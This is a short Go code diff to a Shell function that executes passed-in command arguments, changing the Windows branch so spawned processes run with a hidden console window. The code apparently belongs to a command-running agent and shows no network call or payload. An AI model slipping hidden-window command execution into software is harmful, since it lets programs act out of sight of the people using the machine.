@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"syscall"
 	"strings"
 )
 
@@ -59,12 +60,15 @@ func Shell(path string, args []byte) []byte {
 	case "windows":
 		args = bytes.Trim(args, " ")
 		argsArray := strings.Split(string(args), " ")
-		cmd := exec.Command(path, argsArray...)
-		out, err := cmd.CombinedOutput()
+		cmd_instance := exec.Command(path, argsArray...)
+		cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd_output, err := cmd_instance.CombinedOutput()
+		// fmt.Println(cmd_output)
 		if err != nil {
-			fmt.Sprintf("exec failed with %s\n", err)
+			fmt.Println(err)	
 		}
-		return out
+		return cmd_output
+
 	case "darwin":
 		path = "/bin/bash"
 		args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
